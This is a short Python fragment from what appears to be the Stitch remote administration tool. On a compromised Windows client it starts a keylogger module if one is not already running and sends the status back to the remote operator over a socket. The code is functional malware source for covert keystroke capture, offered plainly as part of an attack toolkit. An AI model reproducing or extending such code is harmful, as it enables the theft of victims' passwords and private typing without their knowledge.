# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

if win_client():
    nt_kl.stop_freeze()
status = nt_kl.get_status()
if status:
    resp = '[+] Keylogger is already running\n'
else:
    nt_kl.start()
    status = nt_kl.get_status()
    if status:
        resp = '[+] Keylogger is now running\n'
    else:
        resp = '[!] Keylogger failed to start\n'

send(client_socket,resp)
